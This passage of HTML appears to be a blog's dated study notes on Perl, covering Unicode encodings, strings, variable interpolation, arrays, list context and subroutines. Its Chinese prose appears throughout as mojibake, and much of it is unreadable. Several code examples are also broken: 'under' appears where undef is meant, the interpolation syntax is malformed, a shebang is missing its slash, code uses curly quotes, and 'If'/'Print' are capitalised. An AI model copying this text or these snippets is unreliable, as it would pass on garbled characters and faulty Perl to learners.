ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºçš„å­—ç¬¦ï¼ˆN &gt; 1ï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰ N ä½éƒ½è®¾ä¸º 1ï¼Œç¬¬ N + 1 ä½è®¾ä¸º0ï¼Œå‰©ä½™çš„ N - 1 ä¸ªå­—èŠ‚çš„å‰ä¸¤ä½éƒ½è®¾ä½ 10ï¼Œå‰©ä¸‹çš„äºŒè¿›åˆ¶ä½åˆ™ä½¿ç”¨è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹æ¥å¡«å……</p><h3 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h3><p>ä¸€ä¸ªæ¦‚å¿µï¼Œâ€œå¹³é¢â€ã€‚</p><p>Unicodeå®šä¹‰å…¨ä¸–ç•Œå­—ç¬¦æ—¶ï¼Œé€šè¿‡åˆ†åŒºå®šä¹‰ï¼Œæ¯ä¸ªåŒºå¯ä»¥å­˜æ”¾65536ä¸ª(<code>2^16</code>)å­—ç¬¦ã€‚ç›®å‰ä¸€å…±æœ‰17ä¸ª(<code>2^4+1</code>)å¹³é¢ï¼Œå› æ­¤ï¼Œç°åœ¨æ•´ä¸ªUnicodeå­—ç¬¦é›†çš„å¤§å°æ˜¯<code>2^21</code></p><p>åŸºæœ¬å¹³é¢(BMP), U+0000<del>U+FFFF, æ‰€æœ‰å¸¸è§çš„å­—ç¬¦éƒ½åœ¨è¿™ä¸ªå¹³é¢ã€‚<br>è¾…åŠ©å¹³é¢(SMP), U+010000</del>U+10FFFF, åŒ…å«å‰©ä¸‹çš„å­—ç¬¦ã€‚</p><hr><h3 id="UTF-8-1"><a href="#UTF-8-1" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>UCS Transformation Format 8-bit,çš„ç¼©å†™ã€‚æ˜¯ä¸€ç§ç¼–ç æ–¹å¼ã€‚</p><hr><p><a href="http://www.cl.cam.ac.uk/~mgk25/ucf/utf-8-history.txt">æ¥æºæ•…äº‹</a></p><hr><p>ä½¿ç”¨Windowsï¼Œæœ€å¥½é€‰ç”¨UTF-16.</p><p><mark>å­—ç´ (grapheme)</mark>å°±æ˜¯å­—å½¢(glyph). åŒä¸€ä¸ªå­—ç´ çš„æ„æˆæ–¹å¼å¯èƒ½ä¸æ­¢ä¸€ç§ï¼Œä¹Ÿè®¸åªç”¨äº†ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿè®¸ç»„åˆäº†å¤šä¸ªå­—ç¬¦ã€‚</p><p><mark>å­—ç´ çš„åˆ†è§£å’Œç»„åˆå½¢å¼</mark>.<br>ç»„åˆå½¢å¼ï¼Œå¤šä¸ªå­—ç¬¦åˆå¹¶ä¸ºå•ä¸ªå­—ç¬¦å¹¶ç”¨ä¸€ä¸ªä»£ç ç‚¹è¡¨ç¤ºã€‚</p><p>è¡¨ç¤ºåŒä¸€ä¸ªå­—ç´ çš„å‡ ä¸ªå­—ç¬¦æ„æˆäº†ç›¸åº”çš„åˆ†è§£ç‰ˆæœ¬ã€‚</p><p>è®¡ç®—æœºå…³å¿ƒçš„æ˜¯å­—ç¬¦è€Œä¸æ˜¯å­—ç´ ã€‚</p><p>æ‰“å¼€UTF-8ç¼–è¯‘æŒ‡ä»¤ï¼š<br><code>use utf8;</code><br>å…¶å‘Šè¯‰perlè§£é‡Šå™¨æŒ‰ç…§UTF-8ç¼–ç ï¼Œæ–¹å¼è§£ææºä»£ç ã€‚</p><p>Unicodeç¼–ç é™¤äº†ä»£ç ç‚¹å¤–è¿˜æœ‰åå­—ï¼Œå¦‚</p><h1 id="2022-x2F-5-x2F-26"><a href="#2022-x2F-5-x2F-26" class="headerlink" title="2022&#x2F;5&#x2F;26"></a>2022&#x2F;5&#x2F;26</h1><h2 id="p34-p52"><a href="#p34-p52" class="headerlink" title="p34~p52"></a>p34~p52</h2><p><mark>å•å¼•å·å’ŒåŒå¼•å·ä¹‹é—´çš„å­—ç¬¦ä¸²ä¸åŒã€‚</mark></p><ul><li>å•å¼•å·ä¸­ï¼Œé™¤äº†å•å¼•å·å’Œåæ–œçº¿å­—ç¬¦å¤–ï¼Œå•å¼•å·å†…æ‰€æœ‰å­—ç¬¦éƒ½ä»£è¡¨ä»–ä»¬è‡ªå·±ã€‚åªæœ‰åœ¨åæ–œçº¿åæ¥ç»­å•å¼•å·æˆ–è€…åæ–œçº¿æ—¶ï¼Œæ‰è¡¨ç¤ºè½¬ä¹‰ã€‚</li><li>åŒå¼•å·ä¸­ï¼Œåæ–œçº¿å¯ä»¥è½¬ä¹‰è®¸å¤šæ§åˆ¶å­—ç¬¦ã€‚</li></ul><p><mark>å­—ç¬¦ä¸²æ“ä½œç¬¦</mark>ï¼š</p><ul><li>concatenation operator, è¿æ¥æ“ä½œç¬¦ï¼Œ<code>.</code>å¦‚<code>â€helloâ€ . â€œworldâ€</code><ul><li>String repetition operator, å­—ç¬¦ä¸²é‡å¤æ“ä½œç¬¦ï¼Œ<code>x</code>å¦‚<code>â€fredâ€ x 3</code>.é‡å¤æ“ä½œç¬¦çš„å·¦æ“ä½œæ•°å¿…ç„¶æ˜¯å­—ç¬¦ä¸²ç±»å‹ã€‚</li></ul></li></ul><p>æ•°å­—å’Œå­—ç¬¦ä¸²ä¼šæ ¹æ®æ“ä½œç¬¦è‡ªåŠ¨è½¬æ¢ã€‚<br>å¤§å¤šæ•°æ—¶å€™ä¸ç”¨å…³å¿ƒæ•°å­—å’Œå­—ç¬¦ä¸²çš„åŒºåˆ«ã€‚</p><p><mark>Perlçš„å†…ç½®è­¦å‘Šä¿¡æ¯ï¼š</mark></p><pre><code class="hljs">#!usr/bin/perluse warnings;</code></pre><p>åˆ©ç”¨<code>diagnostics</code>è·å–è·Ÿè¯¦ç»†çš„é—®é¢˜æè¿°ã€‚</p><pre><code class="hljs">#!/usr/bin/perluse diagnostics;</code></pre><p>ä¸€ç§ä¼˜åŒ–ç¨‹åºçš„æ–¹æ³•ï¼Œå…³é—­è­¦å‘Šä¿¡æ¯ã€‚</p><p>ç”¨<code>-M</code>å‚æ•°å¼€å¯<code>diagnostics</code></p><pre><code class="hljs">$perl -Mdiagnostics ./my_program</code></pre><p>æ ‡é‡å˜é‡çš„åç§°ä»¥<code>$</code>å¼€å¤´ï¼Œè¿™ä¸ªç¬¦å·ä¹Ÿç§°é­”ç¬¦â€œsigilâ€ï¼Œç„¶åæ˜¯Perlæ ‡è¯†ç¬¦ï¼ŒåŒºåˆ†å¤§å°å†™ã€‚å¦‚<code>$name</code>å’Œ<code>$Name</code>, å¹¶ä¸å±€é™äºç”¨ASCIIå­—ç¬¦ã€‚</p><p>é­”ç¬¦çš„å«ä¹‰æ˜¯â€œå–å•ä¸ªä¸œè¥¿â€ã€‚</p><p>å¤§éƒ¨åˆ†å˜é‡åä¹ æƒ¯ä½¿ç”¨å…¨å°å†™ã€‚å…¨å¤§å†™ä¸€èˆ¬ä¸ºè¡¨ç¤ºç‰¹æ®Šæ„ä¹‰çš„Perlä¿ç•™å˜é‡ã€‚</p><p>perlvaræ–‡æ¡£å¯æŸ¥è¯¢æ‰€æœ‰Perlç‰¹æ®Šå˜é‡çš„åç§°ã€‚</p><p><mark>åŒç›®èµ‹å€¼æ“ä½œç¬¦</mark>:<br>å¦‚<code>$fred += 5;</code> <code>$str .= â€œ â€;</code></p><p><mark>å˜é‡å†…æ’</mark>:<br>ä½¿ç”¨åŒå¼•å·å¯ä»¥æŠŠæ ‡é‡å˜é‡æ›¿æ¢ä¸ºå…¶å½“å‰å€¼ã€‚å¦‚</p><pre><code class="hljs">$meal = â€œbrontosaurus steakâ€;$barney = â€œfred ate a $&#123;meal&#125;â€;    #$barney ç°åœ¨æ˜¯â€œfred ate a brontosaurus steakâ€</code></pre><p>æ‰“å°å˜é‡å€¼ä¸å¿…ä½¿ç”¨å˜é‡å†…æ’çš„æ–¹å¼ï¼Œå¦‚<code>print $fred</code>.</p><p>ç”¨èŠ±æ‹¬å·<code>&#123;&#125;</code>å°†å˜é‡åå›´èµ·æ¥ä»¥é¿å…æ­§ä¹‰ã€‚å¦‚ï¼š</p><pre><code class="hljs">$what = â€œbrontosaurus steakâ€print â€œFred ate 3 $(what)s./nâ€;</code></pre><p><mark>ä½¿ç”¨ä»£ç ç‚¹(code point)åˆ›å»ºå­—ç¬¦</mark>.</p><ul><li>chr()å‡½æ•°ï¼Œå°†ä»£ç ç‚¹è½¬æ¢ä¸ºå¯¹åº”å­—ç¬¦ã€‚</li><li>ord()å‡½æ•°ï¼Œå°†å­—ç¬¦è½¬æ¢ä¸ºä»£ç ç‚¹ã€‚</li></ul><p><mark>æ“ä½œç¬¦çš„ä¼˜å…ˆçº§</mark>ï¼Œæ‰€æœ‰åŒæ—¶åœ¨Perlå’ŒCé‡Œå‡ºç°çš„æ“ä½œç¬¦ï¼Œå®ƒä»¬çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§éƒ½æ˜¯ç›¸é€šçš„ã€‚</p><p>ä¼˜å…ˆçº§ç›¸åŒæ—¶ï¼Œé€šè¿‡ç»“åˆæ€§åˆ¤æ–­ã€‚åœ¨é¡ºåºä¸ç¡®å®šæ˜¯ï¼Œå°±ç”¨æ‹¬å·ã€‚</p><p><mark>å­—ç¬¦ä¸²çš„æ¯”è¾ƒæ“ä½œç¬¦ï¼š</mark><br>eq, ne, lt, gt, le, geã€‚</p><p><mark>ifæ§åˆ¶ç»“æ„</mark>ï¼Œä¸€å®šè¦ç”¨è¡¨ç¤ºç•Œé™çš„èŠ±æ‹¬å·ã€‚</p><p>å­—ç¬¦ä¸²â€˜0â€™å’Œ0æ˜¯åŒä¸€ä¸ªæ ‡é‡å€¼ã€‚</p><p><mark>è·å–ç”¨æˆ·è¾“å…¥:</mark><br><code>&lt;STDIN&gt;</code> å…¶è¿”å›çš„å­—ç¬¦ä¸²ä¸€èˆ¬åœ¨æœ«å°¾éƒ½ä¼šå¸¦æœ‰æ¢è¡Œç¬¦ã€‚</p><p>ä½¿ç”¨<code>chomp()</code>æ“ä½œç¬¦å»é™¤æœ«å°¾æ¢è¡Œç¬¦ã€‚å…¶åªèƒ½ä½œç”¨äºå•ä¸ªå˜é‡ï¼Œä¸”å˜é‡çš„å†…å®¹å¿…é¡»ä¸ºå­—ç¬¦ä¸²ã€‚åªåˆ é™¤ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</p><p><code>chomp()</code>å‡½æ•°è¿”å›å®é™…ç§»é™¤çš„å­—ç¬¦æ•°ã€‚</p><p><mark>undefå€¼</mark><br>è¢«ç”¨ä½œæ•°å­—æ—¶è¡¨ç°ä¸º0ï¼Œè¢«ç”¨ä½œå­—ç¬¦ä¸²æ—¶è¡¨ç°ä¸ºç©ºå­—ç¬¦ä¸²ã€‚Perlé€šå¸¸ä¼šå¯¹undefçš„å€¼å‘å‡ºè­¦å‘Šã€‚</p><p><mark>definedå‡½æ•°</mark><br>ç”¨äºåˆ¤æ–­æŸä¸ªå­—ç¬¦ä¸²æ—¶undefè¿˜æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœæ˜¯undefï¼Œè¿”å›å‡ï¼Œå¦åˆ™è¿”å›çœŸã€‚</p><p><mark>åˆ›å»ºundefå€¼</mark><br>ä½¿ç”¨undefæ“ä½œç¬¦ã€‚å¦‚</p><pre><code class="hljs">$madonna = under; #å›åˆ°è™šæ— ï¼Œä»¿ä½›ä»æœªç”¨è¿‡ã€‚</code></pre><h2 id="p53ï½69"><a href="#p53ï½69" class="headerlink" title="p53ï½69"></a>p53ï½69</h2><p><mark>åˆ—è¡¨å’Œæ•°ç»„</mark>è¡¨ç¤ºå¤æ•°(plural).</p><p>åˆ—è¡¨(list)æ˜¯æ ‡é‡çš„æœ‰åºé›†åˆï¼Œæ•°ç»„(array)æ˜¯å­˜å‚¨åˆ—è¡¨çš„å˜é‡ï¼Œæ›´ç²¾ç¡®çš„è¯´ï¼Œåˆ—è¡¨æ˜¯æ•°æ®ï¼Œæ•°ç»„æ˜¯å˜é‡ã€‚</p><p>æ•°ç»„å’Œåˆ—è¡¨å¯ä»¥åŒ…å«ä»»æ„å¤šä¸ªå…ƒç´ ã€‚</p><p>Perlâ€œå»é™¤ä¸å¿…è¦çš„é™åˆ¶â€çš„å“²å­¦ç†å¿µã€‚</p><p>æ•°ç»„çš„åç§°ç©ºé—´å’Œæ ‡é‡çš„åç§°ç©ºé—´æ˜¯å®Œå…¨åˆ†å¼€çš„ã€‚</p><p>è´Ÿæ•°ç´¢å¼•ï¼Œä»æ•°ç»„å°¾ç«¯å¾€å›è®¡æ•°ã€‚</p><p><mark>åˆ—è¡¨ç›´æ¥é‡</mark><br>ç”±åœ†æ‹¬å·å†…ç”¨é€—å·éš”å¼€çš„ä¸€ä¸²æ•°æ®è¡¨ç¤ºï¼Œè¿™äº›æ•°æ®ç§°ä¸ºåˆ—è¡¨å…ƒç´ ã€‚<br><code>(1,2,3)</code></p><p><mark>èŒƒå›´æ“ä½œç¬¦</mark><br><code>..</code>å¦‚<code>(1..100) #100ä¸ªæ•´æ•°æ„æˆçš„åˆ—è¡¨</code>, è¯¥æ“ä½œç¬¦ä¼šä»å·¦è¾¹çš„æ•°å­—è®¡æ•°åˆ°å³è¾¹ï¼Œæ¯æ¬¡åŠ ä¸€ã€‚</p><p><mark>qwç®€å†™</mark><br>quoted word, åŠ ä¸Šå¼•å·çš„å•è¯ï¼ŒPerlä¼šå°†å…¶å½“æˆå•å¼•å·å†…çš„å­—ç¬¦ä¸²å¤„ç†ï¼Œå¦‚ï¼š</p><pre><code class="hljs">(â€œfredâ€, â€œbarneyâ€, â€œbettyâ€, â€œwilmaâ€, â€œdinoâ€)#åŒ( fred barney betty Wilma dino)</code></pre><p>qwç®—æ˜¯ä¸€ç§å¼•ç”¨çš„å½¢å¼ï¼Œæ‰€ä»¥ä¸èƒ½å°†æ³¨é‡Šæ”¾åœ¨qwåˆ—è¡¨ä¸­ï¼Œå¸¸å•ç‹¬æˆè¡Œï¼Œå¦‚ï¼š</p><pre><code class="hljs">qw(    fred    barney    betty    wilma    dino)    </code></pre><p>ä¹Ÿå¯ä»¥ç”¨é™¤åœ†æ‹¬å·ä»¥å¤–çš„å®šç•Œç¬¦ã€‚</p><p>Perlçš„åº§å³é“­æ˜¯â€œThereâ€™s More Than One Way To Do Itâ€</p><p>åˆ—è¡¨å¯èµ‹å€¼ã€‚</p><p><mark>@å­—ç¬¦</mark><br><code>@rocks</code>å¯è¯»ä½œâ€œæ‰€æœ‰çš„rocksâ€.</p><pre><code class="hljs">@rocks = qw(bedrock slate lava);</code></pre><p>$è¡¨ç¤ºæ ‡é‡å’Œ@è¡¨ç¤ºæ•°ç»„çš„ç”±æ¥</p><blockquote><p>Larryå®£ç§°ç¾å…ƒç¬¦å·çœ‹èµ·æ¥åƒ$calarï¼Œatçœ‹èµ·æ¥åƒ@rrayã€‚<br><mark>popå’Œpushæ“ä½œç¬¦</mark><br>Perlå¹¶ä¸æ“…é•¿ä½¿ç”¨ç´¢å¼•å€¼æ¥è®¿é—®æ•°ç»„ã€‚<br>popè´Ÿè´£å–å‡ºæ•°ç»„ä¸­æœ€åä¸€ä¸ªå…ƒç´ å¹¶å°†å…¶ä½œä¸ºè¿”å›å€¼è¿”å›ã€‚</p></blockquote><p>popä¹Ÿå¸¸ç”¨æ¥åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚</p><p><mark>Perlçš„ä¸€ä¸ªæƒ¯ä¾‹ï¼šåªè¦ä¸ä¼šå› ä¸ºæ‹¿æ‰æ‹¬å·è€Œæ”¹å˜æ„¿æ„ï¼Œæ‹¬å·å°±æ˜¯å¯çœç•¥çš„ã€‚</mark></p><p>pushï¼Œæ·»åŠ ä¸€ä¸ªå…ƒç´ (æˆ–ä¸€ä¸²å…ƒç´ )åˆ°æ•°ç»„çš„å°¾ç«¯ã€‚</p><p>popå’Œpushéƒ½åªèƒ½ç”¨æ¥æ“ä½œæ•°ç»„ã€‚</p><p><mark>shiftå’Œunshiftæ“ä½œç¬¦</mark><br>æ“ä½œæ•°ç»„çš„å¼€å¤´ã€‚</p><pre><code class="hljs">$m = shift(@array);unshift(@array, 5);</code></pre><p><mark>spliceæ“ä½œç¬¦</mark><br>æ·»åŠ æˆ–ç§»é™¤æ•°ç»„ä¸­é—´çš„æŸäº›å…ƒç´ ã€‚</p><p>åœ¨åŒå¼•å·ä¸­è‹¥è¦æ˜¾ç¤º@ç¬¦å·ï¼ŒåŠ ä¸Šâ€™\â€™æ¥è½¬ä¹‰ã€‚</p><p><mark>foreachæ§åˆ¶ç»“æ„</mark><br>å¾ªç¯ï¼Œèƒ½é€é¡¹éå†åˆ—è¡¨ä¸­çš„å€¼ã€‚</p><pre><code class="hljs">@rock = qw/ bedrock slate lava /;foreach $rock (@rocks) &#123;    ...&#125;</code></pre><p><mark>Perlæœ€å–œæ¬¢ç”¨çš„é»˜è®¤å˜é‡ï¼š$_</mark></p><pre><code class="hljs">foreach (1..10) &#123;   #é»˜è®¤ç”¨$_ä½œä¸ºæ§åˆ¶å˜é‡    print â€œI can count to $_!\nâ€;&#125;$_ = â€œYabba dab a doo\nâ€print;  #é»˜è®¤æ‰“å°$_å˜é‡çš„å€¼</code></pre><p><mark>reverseæ“ä½œç¬¦</mark><br>è¯»å–åˆ—è¡¨æˆ–æ•°ç»„çš„å€¼ï¼Œå¹¶æŒ‰ç›¸åçš„æ¬¡åºè¿”å›è¯¥åˆ—è¡¨ã€‚ä¸ä¼šä¿®æ”¹ä¼ è¿›æ¥çš„å‚æ•°ã€‚</p><p><mark>sortæ“ä½œç¬¦</mark><br>æ ¹æ®å†…éƒ¨çš„å­—ç¬¦ç¼–ç é¡ºåºå¯¹å®ƒä»¬è¿›è¡Œæ’åºã€‚</p><p><mark>eachæ“ä½œç¬¦</mark></p><p><mark>æ ‡é‡ä¸Šä¸‹æ–‡ä¸åˆ—è¡¨ä¸Šä¸‹æ–‡</mark><br>æ¦‚å¿µ: åŒä¸€ä¸ªè¡¨è¾¾å¼å‡ºç°åœ¨ä¸åŒçš„åœ°æ–¹ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ã€‚</p><h1 id="2022-x2F-5-x2F-27"><a href="#2022-x2F-5-x2F-27" class="headerlink" title="2022&#x2F;5&#x2F;27"></a>2022&#x2F;5&#x2F;27</h1><h2 id="p69ï½72"><a href="#p69ï½72" class="headerlink" title="p69ï½72"></a>p69ï½72</h2><p><mark>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨äº§ç”Ÿæ ‡é‡çš„è¡¨è¾¾å¼</mark><br>å°†undefèµ‹å€¼ç»™æ•°ç»„å¹¶ä¸ä¼šæ¸…ç©ºè¯¥æ•°ç»„ã€‚</p><p><mark>å¼ºåˆ¶æŒ‡å®šæ ‡é‡ä¸Šä¸‹æ–‡</mark><br>ç”¨ä¼ªå‡½æ•°scalarã€‚å®ƒä¸æ˜¯çœŸæ­£çš„å‡½æ•°ï¼Œåªä¸è¿‡å‘Šè¯‰Perlè¿™é‡Œè¦åˆ‡æ¢åˆ°æ ‡é‡ä¸Šä¸‹æ–‡ã€‚</p><p>ä½¿ç”¨Control+Då‘ŠçŸ¥æ“ä½œç³»ç»Ÿï¼Œä¸ä¼šå†æœ‰ä»»ä½•è¾“å…¥ã€‚</p><p>å°†æ•°ç»„äº¤ç»™chompï¼Œå¯ä»¥å»æ‰æ¯ä¸ªå…ƒç´ çš„æ¢è¡Œç¬¦ã€‚</p><p>Perlä¼šåˆ†é…å¯Œè£•çš„å†…å­˜æ¥èŠ‚çœäº‹åçš„æ“ä½œæ—¶é—´ã€‚</p><p>ç¼–ç¨‹æŠ€å·§ï¼š<br>ç›´æ¥æ‰“å°è¾“å…¥</p><h2 id="ç¬¬å››ç« -å­ç¨‹åº"><a href="#ç¬¬å››ç« -å­ç¨‹åº" class="headerlink" title="ç¬¬å››ç«  å­ç¨‹åº"></a>ç¬¬å››ç«  å­ç¨‹åº</h2><h3 id="p73ï½"><a href="#p73ï½" class="headerlink" title="p73ï½"></a>p73ï½</h3><p>å­ç¨‹åº(subroutine).</p><p>å­ç¨‹åºåå±äºç‹¬ç«‹çš„åç§°ç©ºé—´ã€‚</p><p><mark>å®šä¹‰å­ç¨‹åº</mark><br>å…³é”®å­—subï¼Œå­ç¨‹åºåå’ŒèŠ±æ‹¬å·ã€‚å¦‚ï¼š</p><pre><code class="hljs">sub marine &#123;    $n += 1;    print â€œHello, sailor number $n!\nâ€;&#125;</code></pre><p>åœ¨Perlä¸­ï¼Œä¸€èˆ¬ä¸åŒºåˆ†æœ‰è¿”å›å€¼çš„å‡½æ•°(function)å’Œæ— è¿”å›å€¼çš„è¿‡ç¨‹(procesure).</p><p>å­ç¨‹åºä¸€èˆ¬ä¸éœ€è¦äº‹å…ˆå£°æ˜ã€‚</p><p>å­ç¨‹åºçš„å®šä¹‰æ˜¯å…¨å±€çš„ã€‚</p><p>ä½¿ç”¨<code>&amp;</code>è°ƒç”¨å­ç¨‹åºï¼Œé€šå¸¸åŠ ä¸Šä¸€å¯¹æ‹¬å·ï¼Œå¦‚ï¼š</p><pre><code class="hljs">&amp;(marine);</code></pre><p>é€šå¸¸æŠŠå¯¹å­ç¨‹åºçš„è°ƒç”¨ç§°ä¸ºcallingå­ç¨‹åºã€‚</p><p><mark>è¿”å›å€¼</mark><br>åœ¨Perlä¸­ï¼Œæ‰€æœ‰çš„å­ç¨‹åºéƒ½æœ‰ä¸€ä¸ªè¿”å›å€¼ã€‚</p><p>å­ç¨‹åºæœ€åä¸€æ¬¡è¿ç®—çš„ç»“æœå°±æ˜¯è¿”å›å€¼ã€‚</p><p>è¿”å›çš„æ˜¯æœ€åæ‰§è¡Œçš„è¡¨è¾¾å¼çš„ç»“æœï¼Œä½†å¹¶éæ˜¯ä»£ç çš„æœ€åä¸€è¡Œã€‚</p><p>å¦‚ï¼š</p><pre><code class="hljs">sub sum_of_fred_and_barey &#123;print â€œHey, you called the sum_of_fred_and_barney subroutine!\nâ€;$fred + $barney; #è¿™ä¸æ˜¯è¿”å›å€¼ï¼print â€œHey, Iâ€™m returning a value now!\nâ€;&#125;</code></pre><p>è¿”å›å€¼ä¸º1.</p><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><p>argumentã€‚</p><p>Perlä¼šè‡ªåŠ¨å°†å‚æ•°åˆ—è¡¨åŒ–åä¸ºç‰¹æ®Šçš„æ•°ç»„å˜é‡@_ï¼Œè¯¥å˜é‡åœ¨å­ç¨‹åºæ‰§è¡Œæ—¶æœ‰æ•ˆã€‚</p><h4 id="å­ç¨‹åºä¸­çš„ç§æœ‰å˜é‡"><a href="#å­ç¨‹åºä¸­çš„ç§æœ‰å˜é‡" class="headerlink" title="å­ç¨‹åºä¸­çš„ç§æœ‰å˜é‡"></a>å­ç¨‹åºä¸­çš„ç§æœ‰å˜é‡</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒPerlé‡Œé¢æ‰€æœ‰çš„å˜é‡éƒ½æ˜¯å…¨å±€å˜é‡ã€‚</p><p>ä½¿ç”¨<code>my</code>æ“ä½œç¬¦æ¥åˆ›å»ºç§æœ‰å˜é‡ï¼Œç§°ä¹‹ä¸ºè¯æ³•å˜é‡(lexical variable).</p><p>Perlä¸­ï¼Œåˆ†å·çš„ä½œç”¨æ˜¯åˆ†éš”è¯­å¥ï¼Œè€Œä¸æ˜¯å¿…é¡»çš„è¯­å¥ç»“å°¾æ ‡å¿—ã€‚</p><pre><code class="hljs">my($m, $n) = @_;    #å¯¹å­ç¨‹åºçš„å‚æ•°å‘½å</code></pre><p>è¿™ä¸€è¡Œè¯­å¥ä¼šåˆ›å»ºç§æœ‰å˜é‡å¹¶ä¸ºå®ƒä»¬èµ‹å€¼ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨ä¸Šä¸‹æ–‡.</p><h4 id="å˜é•¿å‚æ•°åˆ—è¡¨"><a href="#å˜é•¿å‚æ•°åˆ—è¡¨" class="headerlink" title="å˜é•¿å‚æ•°åˆ—è¡¨"></a>å˜é•¿å‚æ•°åˆ—è¡¨</h4><p>è‡ªæ£€å‚æ•°åˆ—è¡¨ï¼š</p><pre><code class="hljs">sub max &#123;    If (@_ != 2) &#123;        Print â€œWARNING!â€    &#125;    .    .    .&#125;</code></pre><p><mark>ç©ºå‚æ•°åˆ—è¡¨</mark></p><p><mark>è¯æ³•å˜é‡my</mark><br>å¯åœ¨ä»»ä½•è¯­å¥å—ä¸­ä½¿ç”¨ã€‚<br>æ³¨æ„ï¼Œmyæ“ä½œç¬¦åœ¨æ²¡åŠ æ‹¬å·æ—¶ï¼Œåªèƒ½ç”¨æ¥å£°æ˜å•ä¸ªè¯æ³•å˜é‡ã€‚</p><p><mark>åœ¨æ—¥å¸¸çš„Perlç¼–ç¨‹ä¸­ï¼Œæœ€å¥½å¯¹æ¯ä¸ªæ–°å˜é‡éƒ½ä½¿ç”¨myå£°æ˜</mark></p><h1 id="ç¬¬å››ç« -å­ç¨‹åº-1"><a href="#ç¬¬å››ç« -å­ç¨‹åº-1" class="headerlink" title="ç¬¬å››ç«  å­ç¨‹åº"></a>ç¬¬å››ç«  å­ç¨‹åº</h1><p>åŒºåˆ†å­ç¨‹åºå’Œå†…ç½®å‡½æ•°ï¼Œå­ç¨‹åºæ˜¯ç”±ç”¨æˆ·å®šä¹‰çš„ï¼Œè€Œå‡½æ•°åˆ™ä¸ä¸€å®š.</p><p>ä¸€èˆ¬çš„å˜é‡éƒ½æ˜¯å…¨å±€å˜é‡.</p><p>è¦æ³¨æ„æ£€æŸ¥è¿”å›å€¼ã€‚ </p><p>ç‰¹æ®Šçš„æ•°ç»„å˜é‡<code>@_</code>ç”¨äºå­˜æ”¾å‚æ•°åˆ—è¡¨ã€‚</p><p><code>my</code> æ“ä½œç¬¦ï¼Œåˆ›å»ºç§æœ‰å˜é‡ã€‚</p><p>ç›´æ¥ä½¿ç”¨æ•°ç»„â€œåç§°â€æ¥å–å¾—æ•°ç»„å…ƒç´ çš„ä¸ªæ•°ã€‚</p><h2 id="pop-and-push-shift-and-unshift"><a href="#pop-and-push-shift-and-unshift" class="headerlink" title="pop and push, shift and unshift"></a>pop and push, shift and unshift</h2><p>pop and push do things to the end of an array.</p><p>shift and unshift do things to the start of an array.</p><h2 id="The-if-Control-Structure"><a href="#The-if-Control-Structure" class="headerlink" title="The if Control Structure"></a>The if Control Structure</h2><p>The if control structure must have those block curly braces around the conditional code.</p><p><code>foreach</code> ä¹Ÿå¿…é¡»è¦æœ‰èŠ±æ‹¬å·.</p><h2 id="Notes-on-Lexical-my-Variables"><a href="#Notes-on-Lexical-my-Variables" class="headerlink" title="Notes on Lexical (my) Variables"></a>Notes on Lexical (my) Variables</h2><p>Those lexical variables can actully be used in any block.</p><p>åŒºåˆ†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($num) = @_;<br><span class="hljs-keyword">my</span> $num = @_;<br></code></pre></td></tr></table></figure><p>ä¸Šä¸‹æ–‡å«ä¹‰ä¸åŒã€‚</p><p>æœ€å¥½å¯¹æ¯ä¸€ä¸ªæ–°å˜é‡éƒ½ä½¿ç”¨myå£°æ˜,</p><p>Perlä¸­çš„é»˜è®¤å˜é‡<code>$_</code>.</p><p>å¦‚æœç¼–è¯‘å™¨åœ¨è°ƒç”¨å­ç¨‹åºå‰çœ‹åˆ°è¿‡å­ç¨‹åºçš„å®šä¹‰æˆ–è€…Perlé€šè¿‡è¯­æ³•è§„åˆ™åˆ¤æ–­å®ƒåªèƒ½æ˜¯å­ç¨‹åºè°ƒç”¨ï¼Œå°±å¯ä»¥çœç•¥<code>&amp;</code>.</p><h2 id="æŒä¹…æ€§ç§æœ‰å˜é‡"><a href="#æŒä¹…æ€§ç§æœ‰å˜é‡" class="headerlink" title="æŒä¹…æ€§ç§æœ‰å˜é‡"></a>æŒä¹…æ€§ç§æœ‰å˜é‡</h2><p>Using <code>state</code> to define.</p><p>ä¸èƒ½åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­åˆå§‹åŒ–æ•°ç»„å’Œå“ˆå¸Œç±»å‹çš„stateå˜é‡.</p><p>Using <code>Ctrl-D</code> to stop getting values from <STDIN>.</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>One string can be seen as one element of an array.</p><p>Canâ€™t use defined(@array).</p><p>æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦åˆå§‹åŒ–</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">defined</span> <span class="hljs-variable">$var</span>) <br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ä¸€ä¸ªæ•°ç»„æ˜¯å¦ä¸ºç©º</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">if</span> (<span class="hljs-variable">@array</span>) &#123;<span class="hljs-selector-tag">return</span>&#125;;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-5-Input-and-Output"><a href="#CHAPTER-5-Input-and-Output" class="headerlink" title="CHAPTER 5 Input and Output"></a>CHAPTER 5 Input and 